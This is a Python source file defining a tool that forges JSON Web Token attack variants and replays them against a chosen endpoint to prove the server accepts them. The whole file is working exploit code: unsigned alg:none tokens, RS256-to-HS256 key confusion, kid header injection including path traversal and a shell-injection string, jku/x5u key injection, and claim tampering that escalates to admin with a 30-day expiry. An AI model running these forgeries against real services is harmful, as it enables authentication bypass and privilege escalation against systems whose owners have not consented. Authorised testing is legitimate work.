"""TOOL: jwt_forge - forge JWT attack variants and replay them to prove acceptance.

Variants: alg:none / alg:Null, RS256->HS256 key confusion (public key as HMAC
secret), kid header injection, claim tampering (role/admin/exp). Each forge is
replayed against the operator-chosen endpoint and diffed against the original
token's response. No crypto deps — stdlib hmac/hashlib only.
"""
import base64, hashlib, hmac, json, time

from tools import register
from tools._exploit_lib import paced_send, verdict

def _b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _b64u_dec(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def _sign(header, payload, secret=None, alg="none"):
    h = _b64u(json.dumps(header, separators=(",", ":")).encode())
    p = _b64u(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    if alg == "none":
        sig = b""
    elif alg.startswith("HS"):
        sig = hmac.new(secret.encode() if isinstance(secret, str) else secret,
                       signing_input, hashlib.sha256).digest()
    else:
        sig = b""  # asymmetric forging not supported without a key — flagged instead
    return f"{h}.{p}.{_b64u(sig) if sig else ''}"

@register(name="jwt_forge_replay",
          desc="EXPLOIT: JWT forgery + replay — alg:none, RS/HS key confusion, kid injection, claim escalation. Proves server acceptance by response diff.",
          params={"type": "object", "properties": {
              "token": {"type": "string", "description": "original JWT to mutate"},
              "replay_url": {"type": "string", "description": "endpoint where the token is sent"},
              "auth_header": {"type": "string", "default": "Authorization", "description": "header name (Authorization/X-Api-Key/cookie:value)"},
              "claims_override": {"type": "object", "description": "claims to overwrite, e.g. {\"role\":\"admin\"}"},
              "public_key_pem": {"type": "string", "description": "server's RSA public key for RS256->HS256 confusion"},
              "hmac_secret": {"type": "string", "description": "known secret to sign tampered claims"},
              "key_url": {"type": "string", "description": "operator-hosted JWKS URL for jku/x5u injection probes"},
              "key_secret": {"type": "string", "description": "secret matching the JWKS at key_url (b64url in the oct key)"}},
              "required": ["token", "replay_url"]},
          danger="loud")
def jwt_forge_replay(token, replay_url, auth_header="Authorization",
                     claims_override=None, public_key_pem=None, hmac_secret=None,
                     key_url=None, key_secret=None):
    try:
        head = json.loads(_b64u_dec(token.split(".")[0]))
        payload = json.loads(_b64u_dec(token.split(".")[1]))
    except Exception as ex:
        return verdict("jwt_forge_replay", False, f"token unparseable: {ex}")

    # baseline with ORIGINAL token
    st0, body0, _dt = _send_token(replay_url, token, auth_header)
    accepted_orig = 200 <= st0 < 300
    variants = []

    def add(name, tok, note):
        variants.append({"name": name, "token": tok, "note": note})

    # 1. alg:none — default override is role escalation: an accepted token with
    # unchanged claims proves nothing. Operator can pass claims_override={} to test raw acceptance.
    override = claims_override if claims_override is not None else {"role": "admin"}
    for alg in ("none", "None", "NONE", "nOnE"):
        p = dict(payload); p.update(override)
        add(f"alg:{alg}", _sign({"alg": alg, "typ": "JWT"}, p),
            f"unsigned, overrides={list(override.keys())}")
    # 2. claim tamper with known secret
    if hmac_secret:
        p = dict(payload); p.update(claims_override or {"role": "admin"})
        if "exp" in p:
            p["exp"] = int(time.time()) + 86400 * 30
        add("hs256-tampered", _sign(dict(head, alg="HS256"), p, hmac_secret, "HS256"),
            f"signed with supplied secret, overrides={list((claims_override or {'role':'admin'}).keys())}")
    # 3. RS->HS confusion
    if public_key_pem:
        p = dict(payload); p.update(claims_override or {"role": "admin"})
        add("rs256-hs256-confusion", _sign({"alg": "HS256", "typ": "JWT", "kid": head.get("kid", "")},
                                           p, public_key_pem, "HS256"),
            "HMAC-signed with public key as secret (classic confusion)")
    # 4. kid injection (empty-secret tricks)
    for kid in ("../../dev/null", "|echo$IFS$9", "../../../../etc/hostname"):
        p = dict(payload); p.update(claims_override or {})
        add("kid-injection", _sign({"alg": "HS256", "typ": "JWT", "kid": kid}, p,
                                   hmac_secret or "", "HS256"), f"kid={kid} (server-dependent)")
    # 5. jku / x5u key-injection — server fetches the key from OUR URL.
    # Operator hosts a JWKS {"kty":"oct","k":"<b64url secret>"} at key_url and
    # passes the same secret as key_secret; acceptance proves header-controlled key loading.
    if key_url and key_secret:
        p = dict(payload); p.update(claims_override or {"role": "admin"})
        for hname in ("jku", "x5u"):
            add(f"{hname}-injection", _sign({"alg": "HS256", "typ": "JWT", hname: key_url}, p,
                                            key_secret, "HS256"),
                f"key fetched from {hname}={key_url} — acceptance proves header-controlled key loading")

    results, confirmed = [], []
    for v in variants[:12]:
        st, body, dt = _send_token(replay_url, v["token"], auth_header)
        accepted = 200 <= st < 300
        # acceptance heuristics: forged accepted while original was NOT,
        # or forged response matches the original's accepted response closely
        looks_accepted = accepted and (not accepted_orig or _similar(body0, body))
        results.append({"name": v["name"], "status": st, "accepted": accepted,
                        "note": v["note"], "token": v["token"][:120] + "…",
                        "body_sample": (body or "")[:200]})
        if looks_accepted and v["name"] != "alg:nOnE":
            confirmed.append({"variant": v["name"], "status": st,
                              "token": v["token"], "note": v["note"]})

    exploitable = bool(confirmed)
    return verdict("jwt_forge_replay", bool(confirmed),
                   (f"{len(confirmed)} forged variant(s) ACCEPTED — {confirmed[0]['variant']}"
                    if confirmed else
                    f"all variants rejected (baseline original: {st0})"),
                   evidence=[json.dumps(c)[:300] for c in confirmed],
                   baseline={"status": st0, "accepted": accepted_orig},
                   results=results)


def _send_token(url, token, auth_header):
    headers = {}
    if auth_header.lower() == "cookie":
        headers = {"Cookie": f"token={token}"}
    elif auth_header.lower() == "x-api-key":
        headers = {"X-Api-Key": token}
    else:
        headers = {"Authorization": f"Bearer {token}"}
    return paced_send(url, headers=headers)

def _similar(a, b):
    if not a or not b:
        return False
    sa, sb = set(a.split()), set(b.split())
    return len(sa & sb) / max(1, len(sa | sb)) > 0.7
